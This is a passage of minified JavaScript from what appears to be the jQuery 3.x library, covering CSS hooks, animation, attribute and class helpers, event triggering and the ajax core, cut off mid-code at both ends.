0===(n=a.set(e,n,r))||(u?l.setProperty(t,n):l[t]=n))}},css:function(e,t,n,r){var i,o,a,s=X(t);return Re.test(t)||(t=Ve(s)),(a=S.cssHooks[t]||S.cssHooks[s])&&"get"in a&&(i=a.get(e,!0,n)),void 0===i&&(i=Be(e,t,r)),"normal"===i&&t in Qe&&(i=Qe[t]),""===n||n?(o=parseFloat(i),!0===n||isFinite(o)?o||0:i):i}}),S.each(["height","width"],function(e,u){S.cssHooks[u]={get:function(e,t,n){if(t)return!Ge.test(S.css(e,"display"))||e.getClientRects().length&&e.getBoundingClientRect().width?Ze(e,u,n):Ie(e,Ye,function(){return Ze(e,u,n)})},set:function(e,t,n){var r,i=Me(e),o=!v.scrollboxSize()&&"absolute"===i.position,a=(o||n)&&"border-box"===S.css(e,"boxSizing",!1,i),s=n?Ke(e,u,n,a,i):0;return a&&o&&(s-=Math.ceil(e["offset"+u[0].toUpperCase()+u.slice(1)]-parseFloat(i[u])-Ke(e,u,"border",!1,i)-.5)),s&&(r=te.exec(t))&&"px"!==(r[3]||"px")&&(e.style[u]=t,t=S.css(e,u)),Je(0,t,s)}}}),S.cssHooks.marginLeft=_e(v.reliableMarginLeft,function(e,t){if(t)return(parseFloat(Be(e,"marginLeft"))||e.getBoundingClientRect().left-Ie(e,{marginLeft:0},function(){return e.getBoundingClientRect().left}))+"px"}),S.each({margin:"",padding:"",border:"Width"},function(i,o){S.cssHooks[i+o]={expand:function(e){for(var t=0,n={},r="string"==typeof e?e.split(" "):[e];t<4;t++)n[i+ne[t]+o]=r[t]||r[t-2]||r[0];return n}},"margin"!==i&&(S.cssHooks[i+o].set=Je)}),S.fn.extend({css:function(e,t){return B(this,function(e,t,n){var r,i,o={},a=0;if(Array.isArray(t)){for(r=Me(e),i=t.length;a<i;a++)o[t[a]]=S.css(e,t[a],!1,r);return o}return void 0!==n?S.style(e,t,n):S.css(e,t)},e,t,1<arguments.length)}}),((S.Tween=et).prototype={constructor:et,init:function(e,t,n,r,i,o){this.elem=e,this.prop=n,this.easing=i||S.easing._default,this.options=t,this.start=this.now=this.cur(),this.end=r,this.unit=o||(S.cssNumber[n]?"":"px")},cur:function(){var e=et.propHooks[this.prop];return e&&e.get?e.get(this):et.propHooks._default.get(this)},run:function(e){var t,n=et.propHooks[this.prop];return this.options.duration?this.pos=t=S.easing[this.easing](e,this.options.duration*e,0,1,this.options.duration):this.pos=t=e,this.now=(this.end-this.start)*t+this.start,this.options.step&&this.options.step.call(this.elem,this.now,this),n&&n.set?n.set(this):et.propHooks._default.set(this),this}}).init.prototype=et.prototype,(et.propHooks={_default:{get:function(e){var t;return 1!==e.elem.nodeType||null!=e.elem[e.prop]&&null==e.elem.style[e.prop]?e.elem[e.prop]:(t=S.css(e.elem,e.prop,""))&&"auto"!==t?t:0},set:function(e){S.fx.step[e.prop]?S.fx.step[e.prop](e):1!==e.elem.nodeType||!S.cssHooks[e.prop]&&null==e.elem.style[Ve(e.prop)]?e.elem[e.prop]=e.now:S.style(e.elem,e.prop,e.now+e.unit)}}}).scrollTop=et.propHooks.scrollLeft={set:function(e){e.elem.nodeType&&e.elem.parentNode&&(e.elem[e.prop]=e.now)}},S.easing={linear:function(e){return e},swing:function(e){return.5-Math.cos(e*Math.PI)/2},_default:"swing"},S.fx=et.prototype.init,S.fx.step={};var tt,nt,rt,it,ot=/^(?:toggle|show|hide)$/,at=/queueHooks$/;function st(){nt&&(!1===E.hidden&&C.requestAnimationFrame?C.requestAnimationFrame(st):C.setTimeout(st,S.fx.interval),S.fx.tick())}function ut(){return C.setTimeout(function(){tt=void 0}),tt=Date.now()}function lt(e,t){var n,r=0,i={height:e};for(t=t?1:0;r<4;r+=2-t)i["margin"+(n=ne[r])]=i["padding"+n]=e;return t&&(i.opacity=i.width=e),i}function ct(e,t,n){for(var r,i=(ft.tweeners[t]||[]).concat(ft.tweeners["*"]),o=0,a=i.length;o<a;o++)if(r=i[o].call(n,t,e))return r}function ft(o,e,t){var n,a,r=0,i=ft.prefilters.length,s=S.Deferred().always(function(){delete u.elem}),u=function(){if(a)return!1;for(var e=tt||ut(),t=Math.max(0,l.startTime+l.duration-e),n=1-(t/l.duration||0),r=0,i=l.tweens.length;r<i;r++)l.tweens[r].run(n);return s.notifyWith(o,[l,n,t]),n<1&&i?t:(i||s.notifyWith(o,[l,1,0]),s.resolveWith(o,[l]),!1)},l=s.promise({elem:o,props:S.extend({},e),opts:S.extend(!0,{specialEasing:{},easing:S.easing._default},t),originalProperties:e,originalOptions:t,startTime:tt||ut(),duration:t.duration,tweens:[],createTween:function(e,t){var n=S.Tween(o,l.opts,e,t,l.opts.specialEasing[e]||l.opts.easing);return l.tweens.push(n),n},stop:function(e){var t=0,n=e?l.tweens.length:0;if(a)return this;for(a=!0;t<n;t++)l.tweens[t].run(1);return e?(s.notifyWith(o,[l,1,0]),s.resolveWith(o,[l,e])):s.rejectWith(o,[l,e]),this}}),c=l.props;for(!function(e,t){var n,r,i,o,a;for(n in e)if(i=t[r=X(n)],o=e[n],Array.isArray(o)&&(i=o[1],o=e[n]=o[0]),n!==r&&(e[r]=o,delete e[n]),(a=S.cssHooks[r])&&"expand"in a)for(n in o=a.expand(o),delete e[r],o)n in e||(e[n]=o[n],t[n]=i);else t[r]=i}(c,l.opts.specialEasing);r<i;r++)if(n=ft.prefilters[r].call(l,o,c,l.opts))return m(n.stop)&&(S._queueHooks(l.elem,l.opts.queue).stop=n.stop.bind(n)),n;return S.map(c,ct,l),m(l.opts.start)&&l.opts.start.call(o,l),l.progress(l.opts.progress).done(l.opts.done,l.opts.complete).fail(l.opts.fail).always(l.opts.always),S.fx.timer(S.extend(u,{elem:o,anim:l,queue:l.opts.queue})),l}S.Animation=S.extend(ft,{tweeners:{"*":[function(e,t){var n=this.createTween(e,t);return se(n.elem,e,te.exec(t),n),n}]},tweener:function(e,t){m(e)?(t=e,e=["*"]):e=e.match(P);for(var n,r=0,i=e.length;r<i;r++)n=e[r],ft.tweeners[n]=ft.tweeners[n]||[],ft.tweeners[n].unshift(t)},prefilters:[function(e,t,n){var r,i,o,a,s,u,l,c,f="width"in t||"height"in t,p=this,d={},h=e.style,g=e.nodeType&&ae(e),y=Y.get(e,"fxshow");for(r in n.queue||(null==(a=S._queueHooks(e,"fx")).unqueued&&(a.unqueued=0,s=a.empty.fire,a.empty.fire=function(){a.unqueued||s()}),a.unqueued++,p.always(function(){p.always(function(){a.unqueued--,S.queue(e,"fx").length||a.empty.fire()})})),t)if(i=t[r],ot.test(i)){if(delete t[r],o=o||"toggle"===i,i===(g?"hide":"show")){if("show"!==i||!y||void 0===y[r])continue;g=!0}d[r]=y&&y[r]||S.style(e,r)}if((u=!S.isEmptyObject(t))||!S.isEmptyObject(d))for(r in f&&1===e.nodeType&&(n.overflow=[h.overflow,h.overflowX,h.overflowY],null==(l=y&&y.display)&&(l=Y.get(e,"display")),"none"===(c=S.css(e,"display"))&&(l?c=l:(le([e],!0),l=e.style.display||l,c=S.css(e,"display"),le([e]))),("inline"===c||"inline-block"===c&&null!=l)&&"none"===S.css(e,"float")&&(u||(p.done(function(){h.display=l}),null==l&&(c=h.display,l="none"===c?"":c)),h.display="inline-block")),n.overflow&&(h.overflow="hidden",p.always(function(){h.overflow=n.overflow[0],h.overflowX=n.overflow[1],h.overflowY=n.overflow[2]})),u=!1,d)u||(y?"hidden"in y&&(g=y.hidden):y=Y.access(e,"fxshow",{display:l}),o&&(y.hidden=!g),g&&le([e],!0),p.done(function(){for(r in g||le([e]),Y.remove(e,"fxshow"),d)S.style(e,r,d[r])})),u=ct(g?y[r]:0,r,p),r in y||(y[r]=u.start,g&&(u.end=u.start,u.start=0))}],prefilter:function(e,t){t?ft.prefilters.unshift(e):ft.prefilters.push(e)}}),S.speed=function(e,t,n){var r=e&&"object"==typeof e?S.extend({},e):{complete:n||!n&&t||m(e)&&e,duration:e,easing:n&&t||t&&!m(t)&&t};return S.fx.off?r.duration=0:"number"!=typeof r.duration&&(r.duration in S.fx.speeds?r.duration=S.fx.speeds[r.duration]:r.duration=S.fx.speeds._default),null!=r.queue&&!0!==r.queue||(r.queue="fx"),r.old=r.complete,r.complete=function(){m(r.old)&&r.old.call(this),r.queue&&S.dequeue(this,r.queue)},r},S.fn.extend({fadeTo:function(e,t,n,r){return this.filter(ae).css("opacity",0).show().end().animate({opacity:t},e,n,r)},animate:function(t,e,n,r){var i=S.isEmptyObject(t),o=S.speed(e,n,r),a=function(){var e=ft(this,S.extend({},t),o);(i||Y.get(this,"finish"))&&e.stop(!0)};return a.finish=a,i||!1===o.queue?this.each(a):this.queue(o.queue,a)},stop:function(i,e,o){var a=function(e){var t=e.stop;delete e.stop,t(o)};return"string"!=typeof i&&(o=e,e=i,i=void 0),e&&this.queue(i||"fx",[]),this.each(function(){var e=!0,t=null!=i&&i+"queueHooks",n=S.timers,r=Y.get(this);if(t)r[t]&&r[t].stop&&a(r[t]);else for(t in r)r[t]&&r[t].stop&&at.test(t)&&a(r[t]);for(t=n.length;t--;)n[t].elem!==this||null!=i&&n[t].queue!==i||(n[t].anim.stop(o),e=!1,n.splice(t,1));!e&&o||S.dequeue(this,i)})},finish:function(a){return!1!==a&&(a=a||"fx"),this.each(function(){var e,t=Y.get(this),n=t[a+"queue"],r=t[a+"queueHooks"],i=S.timers,o=n?n.length:0;for(t.finish=!0,S.queue(this,a,[]),r&&r.stop&&r.stop.call(this,!0),e=i.length;e--;)i[e].elem===this&&i[e].queue===a&&(i[e].anim.stop(!0),i.splice(e,1));for(e=0;e<o;e++)n[e]&&n[e].finish&&n[e].finish.call(this);delete t.finish})}}),S.each(["toggle","show","hide"],function(e,r){var i=S.fn[r];S.fn[r]=function(e,t,n){return null==e||"boolean"==typeof e?i.apply(this,arguments):this.animate(lt(r,!0),e,t,n)}}),S.each({slideDown:lt("show"),slideUp:lt("hide"),slideToggle:lt("toggle"),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(e,r){S.fn[e]=function(e,t,n){return this.animate(r,e,t,n)}}),S.timers=[],S.fx.tick=function(){var e,t=0,n=S.timers;for(tt=Date.now();t<n.length;t++)(e=n[t])()||n[t]!==e||n.splice(t--,1);n.length||S.fx.stop(),tt=void 0},S.fx.timer=function(e){S.timers.push(e),S.fx.start()},S.fx.interval=13,S.fx.start=function(){nt||(nt=!0,st())},S.fx.stop=function(){nt=null},S.fx.speeds={slow:600,fast:200,_default:400},S.fn.delay=function(r,e){return r=S.fx&&S.fx.speeds[r]||r,e=e||"fx",this.queue(e,function(e,t){var n=C.setTimeout(e,r);t.stop=function(){C.clearTimeout(n)}})},rt=E.createElement("input"),it=E.createElement("select").appendChild(E.createElement("option")),rt.type="checkbox",v.checkOn=""!==rt.value,v.optSelected=it.selected,(rt=E.createElement("input")).value="t",rt.type="radio",v.radioValue="t"===rt.value;var pt,dt=S.expr.attrHandle;S.fn.extend({attr:function(e,t){return B(this,S.attr,e,t,1<arguments.length)},removeAttr:function(e){return this.each(function(){S.removeAttr(this,e)})}}),S.extend({attr:function(e,t,n){var r,i,o=e.nodeType;if(3!==o&&8!==o&&2!==o)return"undefined"==typeof e.getAttribute?S.prop(e,t,n):(1===o&&S.isXMLDoc(e)||(i=S.attrHooks[t.toLowerCase()]||(S.expr.match.bool.test(t)?pt:void 0)),void 0!==n?null===n?void S.removeAttr(e,t):i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:(e.setAttribute(t,n+""),n):i&&"get"in i&&null!==(r=i.get(e,t))?r:null==(r=S.find.attr(e,t))?void 0:r)},attrHooks:{type:{set:function(e,t){if(!v.radioValue&&"radio"===t&&A(e,"input")){var n=e.value;return e.setAttribute("type",t),n&&(e.value=n),t}}}},removeAttr:function(e,t){var n,r=0,i=t&&t.match(P);if(i&&1===e.nodeType)while(n=i[r++])e.removeAttribute(n)}}),pt={set:function(e,t,n){return!1===t?S.removeAttr(e,n):e.setAttribute(n,n),n}},S.each(S.expr.match.bool.source.match(/\w+/g),function(e,t){var a=dt[t]||S.find.attr;dt[t]=function(e,t,n){var r,i,o=t.toLowerCase();return n||(i=dt[o],dt[o]=r,r=null!=a(e,t,n)?o:null,dt[o]=i),r}});var ht=/^(?:input|select|textarea|button)$/i,gt=/^(?:a|area)$/i;function yt(e){return(e.match(P)||[]).join(" ")}function vt(e){return e.getAttribute&&e.getAttribute("class")||""}function mt(e){return Array.isArray(e)?e:"string"==typeof e&&e.match(P)||[]}S.fn.extend({prop:function(e,t){return B(this,S.prop,e,t,1<arguments.length)},removeProp:function(e){return this.each(function(){delete this[S.propFix[e]||e]})}}),S.extend({prop:function(e,t,n){var r,i,o=e.nodeType;if(3!==o&&8!==o&&2!==o)return 1===o&&S.isXMLDoc(e)||(t=S.propFix[t]||t,i=S.propHooks[t]),void 0!==n?i&&"set"in i&&void 0!==(r=i.set(e,n,t))?r:e[t]=n:i&&"get"in i&&null!==(r=i.get(e,t))?r:e[t]},propHooks:{tabIndex:{get:function(e){var t=S.find.attr(e,"tabindex");return t?parseInt(t,10):ht.test(e.nodeName)||gt.test(e.nodeName)&&e.href?0:-1}}},propFix:{"for":"htmlFor","class":"className"}}),v.optSelected||(S.propHooks.selected={get:function(e){var t=e.parentNode;return t&&t.parentNode&&t.parentNode.selectedIndex,null},set:function(e){var t=e.parentNode;t&&(t.selectedIndex,t.parentNode&&t.parentNode.selectedIndex)}}),S.each(["tabIndex","readOnly","maxLength","cellSpacing","cellPadding","rowSpan","colSpan","useMap","frameBorder","contentEditable"],function(){S.propFix[this.toLowerCase()]=this}),S.fn.extend({addClass:function(t){var e,n,r,i,o,a;return m(t)?this.each(function(e){S(this).addClass(t.call(this,e,vt(this)))}):(e=mt(t)).length?this.each(function(){if(r=vt(this),n=1===this.nodeType&&" "+yt(r)+" "){for(o=0;o<e.length;o++)i=e[o],n.indexOf(" "+i+" ")<0&&(n+=i+" ");a=yt(n),r!==a&&this.setAttribute("class",a)}}):this},removeClass:function(t){var e,n,r,i,o,a;return m(t)?this.each(function(e){S(this).removeClass(t.call(this,e,vt(this)))}):arguments.length?(e=mt(t)).length?this.each(function(){if(r=vt(this),n=1===this.nodeType&&" "+yt(r)+" "){for(o=0;o<e.length;o++){i=e[o];while(-1<n.indexOf(" "+i+" "))n=n.replace(" "+i+" "," ")}a=yt(n),r!==a&&this.setAttribute("class",a)}}):this:this.attr("class","")},toggleClass:function(t,n){var e,r,i,o,a=typeof t,s="string"===a||Array.isArray(t);return m(t)?this.each(function(e){S(this).toggleClass(t.call(this,e,vt(this),n),n)}):"boolean"==typeof n&&s?n?this.addClass(t):this.removeClass(t):(e=mt(t),this.each(function(){if(s)for(o=S(this),i=0;i<e.length;i++)r=e[i],o.hasClass(r)?o.removeClass(r):o.addClass(r);else void 0!==t&&"boolean"!==a||((r=vt(this))&&Y.set(this,"__className__",r),this.setAttribute&&this.setAttribute("class",r||!1===t?"":Y.get(this,"__className__")||""))}))},hasClass:function(e){var t,n,r=0;t=" "+e+" ";while(n=this[r++])if(1===n.nodeType&&-1<(" "+yt(vt(n))+" ").indexOf(t))return!0;return!1}});var xt=/\r/g;S.fn.extend({val:function(n){var r,e,i,t=this[0];return arguments.length?(i=m(n),this.each(function(e){var t;1===this.nodeType&&(null==(t=i?n.call(this,e,S(this).val()):n)?t="":"number"==typeof t?t+="":Array.isArray(t)&&(t=S.map(t,function(e){return null==e?"":e+""})),(r=S.valHooks[this.type]||S.valHooks[this.nodeName.toLowerCase()])&&"set"in r&&void 0!==r.set(this,t,"value")||(this.value=t))})):t?(r=S.valHooks[t.type]||S.valHooks[t.nodeName.toLowerCase()])&&"get"in r&&void 0!==(e=r.get(t,"value"))?e:"string"==typeof(e=t.value)?e.replace(xt,""):null==e?"":e:void 0}}),S.extend({valHooks:{option:{get:function(e){var t=S.find.attr(e,"value");return null!=t?t:yt(S.text(e))}},select:{get:function(e){var t,n,r,i=e.options,o=e.selectedIndex,a="select-one"===e.type,s=a?null:[],u=a?o+1:i.length;for(r=o<0?u:a?o:0;r<u;r++)if(((n=i[r]).selected||r===o)&&!n.disabled&&(!n.parentNode.disabled||!A(n.parentNode,"optgroup"))){if(t=S(n).val(),a)return t;s.push(t)}return s},set:function(e,t){var n,r,i=e.options,o=S.makeArray(t),a=i.length;while(a--)((r=i[a]).selected=-1<S.inArray(S.valHooks.option.get(r),o))&&(n=!0);return n||(e.selectedIndex=-1),o}}}}),S.each(["radio","checkbox"],function(){S.valHooks[this]={set:function(e,t){if(Array.isArray(t))return e.checked=-1<S.inArray(S(e).val(),t)}},v.checkOn||(S.valHooks[this].get=function(e){return null===e.getAttribute("value")?"on":e.value})}),v.focusin="onfocusin"in C;var bt=/^(?:focusinfocus|focusoutblur)$/,wt=function(e){e.stopPropagation()};S.extend(S.event,{trigger:function(e,t,n,r){var i,o,a,s,u,l,c,f,p=[n||E],d=y.call(e,"type")?e.type:e,h=y.call(e,"namespace")?e.namespace.split("."):[];if(o=f=a=n=n||E,3!==n.nodeType&&8!==n.nodeType&&!bt.test(d+S.event.triggered)&&(-1<d.indexOf(".")&&(d=(h=d.split(".")).shift(),h.sort()),u=d.indexOf(":")<0&&"on"+d,(e=e[S.expando]?e:new S.Event(d,"object"==typeof e&&e)).isTrigger=r?2:3,e.namespace=h.join("."),e.rnamespace=e.namespace?new RegExp("(^|\\.)"+h.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,e.result=void 0,e.target||(e.target=n),t=null==t?[e]:S.makeArray(t,[e]),c=S.event.special[d]||{},r||!c.trigger||!1!==c.trigger.apply(n,t))){if(!r&&!c.noBubble&&!x(n)){for(s=c.delegateType||d,bt.test(s+d)||(o=o.parentNode);o;o=o.parentNode)p.push(o),a=o;a===(n.ownerDocument||E)&&p.push(a.defaultView||a.parentWindow||C)}i=0;while((o=p[i++])&&!e.isPropagationStopped())f=o,e.type=1<i?s:c.bindType||d,(l=(Y.get(o,"events")||Object.create(null))[e.type]&&Y.get(o,"handle"))&&l.apply(o,t),(l=u&&o[u])&&l.apply&&V(o)&&(e.result=l.apply(o,t),!1===e.result&&e.preventDefault());return e.type=d,r||e.isDefaultPrevented()||c._default&&!1!==c._default.apply(p.pop(),t)||!V(n)||u&&m(n[d])&&!x(n)&&((a=n[u])&&(n[u]=null),S.event.triggered=d,e.isPropagationStopped()&&f.addEventListener(d,wt),n[d](),e.isPropagationStopped()&&f.removeEventListener(d,wt),S.event.triggered=void 0,a&&(n[u]=a)),e.result}},simulate:function(e,t,n){var r=S.extend(new S.Event,n,{type:e,isSimulated:!0});S.event.trigger(r,null,t)}}),S.fn.extend({trigger:function(e,t){return this.each(function(){S.event.trigger(e,t,this)})},triggerHandler:function(e,t){var n=this[0];if(n)return S.event.trigger(e,t,n,!0)}}),v.focusin||S.each({focus:"focusin",blur:"focusout"},function(n,r){var i=function(e){S.event.simulate(r,e.target,S.event.fix(e))};S.event.special[r]={setup:function(){var e=this.ownerDocument||this.document||this,t=Y.access(e,r);t||e.addEventListener(n,i,!0),Y.access(e,r,(t||0)+1)},teardown:function(){var e=this.ownerDocument||this.document||this,t=Y.access(e,r)-1;t?Y.access(e,r,t):(e.removeEventListener(n,i,!0),Y.remove(e,r))}}});var Tt=C.location,Ct={guid:Date.now()},Et=/\?/;S.parseXML=function(e){var t,n;if(!e||"string"!=typeof e)return null;try{t=(new C.DOMParser).parseFromString(e,"text/xml")}catch(e){}return n=t&&t.getElementsByTagName("parsererror")[0],t&&!n||S.error("Invalid XML: "+(n?S.map(n.childNodes,function(e){return e.textContent}).join("\n"):e)),t};var St=/\[\]$/,kt=/\r?\n/g,At=/^(?:submit|button|image|reset|file)$/i,Nt=/^(?:input|select|textarea|keygen)/i;function jt(n,e,r,i){var t;if(Array.isArray(e))S.each(e,function(e,t){r||St.test(n)?i(n,t):jt(n+"["+("object"==typeof t&&null!=t?e:"")+"]",t,r,i)});else if(r||"object"!==w(e))i(n,e);else for(t in e)jt(n+"["+t+"]",e[t],r,i)}S.param=function(e,t){var n,r=[],i=function(e,t){var n=m(t)?t():t;r[r.length]=encodeURIComponent(e)+"="+encodeURIComponent(null==n?"":n)};if(null==e)return"";if(Array.isArray(e)||e.jquery&&!S.isPlainObject(e))S.each(e,function(){i(this.name,this.value)});else for(n in e)jt(n,e[n],t,i);return r.join("&")},S.fn.extend({serialize:function(){return S.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=S.prop(this,"elements");return e?S.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!S(this).is(":disabled")&&Nt.test(this.nodeName)&&!At.test(e)&&(this.checked||!pe.test(e))}).map(function(e,t){var n=S(this).val();return null==n?null:Array.isArray(n)?S.map(n,function(e){return{name:t.name,value:e.replace(kt,"\r\n")}}):{name:t.name,value:n.replace(kt,"\r\n")}}).get()}});var Dt=/%20/g,qt=/#.*$/,Lt=/([?&])_=[^&]*/,Ht=/^(.*?):[ \t]*([^\r\n]*)$/gm,Ot=/^(?:GET|HEAD)$/,Pt=/^\/\//,Rt={},Mt={},It="*/".concat("*"),Wt=E.createElement("a");function Ft(o){return function(e,t){"string"!=typeof e&&(t=e,e="*");var n,r=0,i=e.toLowerCase().match(P)||[];if(m(t))while(n=i[r++])"+"===n[0]?(n=n.slice(1)||"*",(o[n]=o[n]||[]).unshift(t)):(o[n]=o[n]||[]).push(t)}}function $t(t,i,o,a){var s={},u=t===Mt;function l(e){var r;return s[e]=!0,S.each(t[e]||[],function(e,t){var n=t(i,o,a);return"string"!=typeof n||u||s[n]?u?!(r=n):void 0:(i.dataTypes.unshift(n),l(n),!1)}),r}return l(i.dataTypes[0])||!s["*"]&&l("*")}function Bt(e,t){var n,r,i=S.ajaxSettings.flatOptions||{};for(n in t)void 0!==t[n]&&((i[n]?e:r||(r={}))[n]=t[n]);return r&&S.extend(!0,e,r),e}Wt.href=Tt.href,S.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:Tt.href,type:"GET",isLocal:/^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Tt.protocol),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":It,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/\bxml\b/,html:/\bhtml/,json:/\bjson\b/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":JSON.parse,"text xml":S.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?Bt(Bt(e,S.ajaxSettings),t):Bt(S.ajaxSettings,e)},ajaxPrefilter:Ft(Rt),ajaxTransport:Ft(Mt),ajax:function(e,t){"object"==typeof e&&(t=e,e=void 0),t=t||{};var c,f,p,n,d,r,h,g,i,o,y=S.ajaxSetup({},t),v=y.context||y,m=y.context&&(v.nodeType||v.jquery)?S(v):S.event,x=S.Deferred(),b=S.Callbacks("once memory"),w=y.statusCode||{},a={},s={},u="canceled",T={readyState:0,getResponseHeader:function(e){var t;if(h){if(!n){n={};while(t=Ht.exec(p))n[t[1].toLowerCase()+" "]=(n[t[1].toLowerCase()+" "]||[]).concat(t[2])}t=n[e.toLowerCase()+" "]}return null==t?null:t.join(", ")},getAllResponseHeaders:function(){return h?p:null},setRequestHeader:function(e,t){return null==h&&(e=s[e.toLowerCase()]=s[e.toLowerCase()]||e,a[e]=t),this},overrideMimeType:function(e){return null==h&&(y.mimeType=e),this},statusCode:function(e){var t;if(e)if(h)T.always(e[T.status]);else for(t in e)w[t]=[w[t],e[t]];return this},abort:function(e){var t=e||u;return c&&c.abort(t),l(0,t),this}};if(x.promise(T),y.url=((e||y.url||Tt.href)+"").replace(Pt,Tt.protocol+"//"),y.type=t.method||t.type||y.method||y.type,y.dataTypes=(y.dataType||"*").toLowerCase().match(P)||[""],null==y.crossDomain){r=E.createElement("a");try{r.href=y.url,r.href=r.href,y.crossDomain=Wt.protocol+"//"+Wt.host!=r.protocol+"//"+r.host}catch(e){y.crossDomain=!0}}if(y.data&&y.processData&&"string"!=typeof y.data&&(y.data=S.param(y.data,y.traditional)),$t(Rt,y,t,T),h)return T;for(i in(g=S.event&&y.global)&&0==S.active++&&S.event.trigger("ajaxStart"),y.type=y.type.toUpperCase(),y.hasContent=!Ot.test(y.type),f=y.url.replace(qt,""),y.hasContent?y.data&&y.processData&&0===(y.contentType||"").indexOf("application/x-www-form-urlencoded")&&(y.data=y.data.replace(Dt,"+")):(o=y.url.slice(f.length),y.data&&(y.processData||"string"==typeof y.data)&&(f+=(Et.test(f)?"&":"?")+y.data,delete y.data),!1===y.cache&&(f=f.replace(Lt,"$1"),o=(Et.test(f)?"&":"?")+"_="+Ct.guid+++o),y.url=f+o),y.ifModified&&(S.lastModified[f]&&T.setRequestHeader("If-Modified-Since",S.lastModified[f]),S.etag[f]&&T.setRequestHeader("If-None-Match",S.etag[f])),(y.data&&y.hasContent&&!1!==y.contentType||t.contentType)&&T.setRequestHeader("Content-Type",y.contentType),T.setRequestHeader("Accept",y.dataTypes[0]&&y.accepts[y.dataTypes[0]]?y.accepts[y.dataTypes[0]]+("*"!==y.dataTypes[0]?", "+It+"; q=0.01":""):y.accepts["*"]),y.headers)T.setRequestHeader(i,y.headers[i]);if(y.beforeSend&&(!1===y.beforeSend.call(v,T,y)||h))return T.abort();if(u="abort",b.add(y.complete),T.done(y.success),T.fail(y.error),c=$t(Mt,y,t,T)){if(T.readyState=1,g&&m.trigger("ajaxSend",[T,y]),h)return T;y.async&&0<y.timeout&&(d=C.setTimeout(function(){T.abort("timeout")},y.timeout));try{h=!1,c.send(a,l)}catch(e){if(h)throw e;l(-1,e)}}else l(-1,"No Transport");function l(e,t,n,r){var i,o,a,s,u,l=t;h||(h=!0,d&&C.clearTimeout(d),c=void 0,p=r||"",T.readyState=0<e?4:0,i=200<=e&&e<300||304===e,n&&(s=function(e,t,n){var r,i,o,a,s=e.contents,u=e.dataTypes;while("*"===u[0])u.shift(),void 0===r&&(r=e.mimeType||t.getResponseHeader("Content-Type"));if(r)for(i in s)if(s[i]&&s[i].test(r)){u.unshift(i);break}if(u[0]in n)o=u[0];else{for(i in n){if(!u[0]||e.converters[i+" "+u[0]]){o=i;break}a||(a=i)}o=o||a}if(o)return o!==u[0]&&u.unshift(o),n[o]}(y,T,n)),!i&&-1<S.inArray("script",y.dataTypes)&&S.inArray("json",y.dataTypes)<0&&(y.converters["text script"]=function(){}),s=function(e,t,n,r){var i,o,a,s,u,l={},c=e.dataTypes.slice();if(c[1])for(a in e.converters)l[a.toLowerCase()]=e.converters[a];o=c.shift();while(o)if(e.responseFields[o]&&(n[e.responseFields[o]]=t),!u&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),u=o,o=c.shift())if("*"===o)o=u;else if("*"!==u&&u!==o){if(!(a=l[u+" "+o]||l["* "+o]))for(i in l)if((s=i.split(" "))[1]===o&&(a=l[u+" "+s[0]]||l["* "+s[0]])){!0===a?a=l[i]:!0!==l[i]&&(o=s[0],c.unshift(s[1]));break}if(!0!==a)if(a&&e["throws"])t=a(t);else try{t=a(t)}catch(e){return{state:"parsererror",error:a?e:"No conversion from "+u+" to "+o}}}return{state:"success",data:t}}(y,s,T,i),i?(y.ifModified&&((u=T.getResponseHeader("Last-Modified"))&&(S.lastModified[f]=u),(u=T.getResponseHeader("etag"))&&(S.etag[f]=u)),204===e||"HEAD"===y.type?l="nocontent":304===e?l="notmodified":(l=s.state,o=s.data,i=!(a=s.error))):(a=l,!e&&l||(l="error",e<0&&(e=0))),T.status=e,T.statusText=(t||l)+"",i?x.resolveWith(v,[o,l,T]):x.rejectWith(v,[T,l,a]),T.statusCode(w),w=void 0,g&&m.trigger(i?"ajaxSuccess":"ajaxError",[T,y,i?o:a]),b.fireWith(v,[T,l]),g&&(m.trigger("ajaxComplete",[T,y]),--S.active||S.event.trigger("ajaxStop")))}return T},getJSON:function(e,t,n){return S.get(e,t,n,"json")},getScript:function(e,t){return S.get(e,void 0,t,"script")}}),S.each(["get","post"],function(e,i){S[i]=function(e,t,n,r){return m(t)&&(r=r||n,n=t,t=void 0),S.ajax(S.extend({url:e,type:i,dataType:r,data:t,success:n},S.isPlainObject(e)&&e))}}),S.ajaxPrefilter(function(e){var t;for(t in e.headers)"content-type"===t.toLowerCase()&&(e.contentType=e.headers[t]||"")}),S._evalUrl=function(e,t,n){return S.ajax({url:e,type:"GET",dataType:"script",cache:!0,async:!1,global:!1,converters:{"text script":function(){}},dataFilter:function(e){S.globalEval(e,t,n)}})},S.fn.extend({wrapAll:function(e){var t;return this[0]&&(m(e)&&(e=e.call(this[0])),t=S(e,this[0].ownerDocument).eq(0).clone(!0),this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){var e=this;while(e.firstElementChild)e=e.firstElementChild;return e}).append(this)),this},wrapInner:function(n){return m(n)?this.each(function(e){S(this).wrapInner(n.call(this,e))}):this.each(function(){var e=S(this),t=e.contents();t.length?t.wrapAll(n):e.append(n)})},wrap:function(t){var n=m(t);return this.each(function(e){S(this).wrapAll(n?t.call(this,e):t)})},unwrap:function(e){return this.parent(e).not("body").each(function(){S(this).replaceWith(this.childNodes)}),this}}),S.expr.pseudos.hidden=function(e){return!S.expr.pseudos.visible(e)},S.expr.pseudos.visible=function(e){return!!(e.offsetWidth||e.offsetHeight||e.getClientRects().length)},S.ajaxSettings.xhr=function(){try{return new C.XMLHttpRequest}catch(e){}};var _t={0:200,1223:204},zt=S.ajaxSettings.xhr();v.cors=!!zt&&"withCredentials"in zt,v.ajax=zt=!!zt,S.ajaxTransport(function(i){var o,a;if(v.cors||zt&&!i.crossDomain)return{send:function(e,t){var 